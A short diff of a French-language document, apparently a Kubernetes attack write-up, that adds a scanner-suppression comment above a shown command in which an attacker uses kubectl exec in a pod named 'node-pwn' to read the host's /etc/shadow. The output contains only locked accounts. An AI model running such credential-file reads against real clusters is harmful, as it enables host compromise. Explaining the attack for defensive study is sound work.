@@ -165,6 +165,7 @@ Le pod démarre. Depuis le conteneur, l'attaquant lit le fichier des mots de pas
 
 ```
 $ kubectl -n default exec node-pwn -- head -3 /host/etc/shadow
+# nosemgrep: generic.secrets.security.detected-etc-shadow.detected-etc-shadow
 root:*:20430:0:99999:7:::
 daemon:*:20430:0:99999:7:::
 bin:*:20430:0:99999:7:::
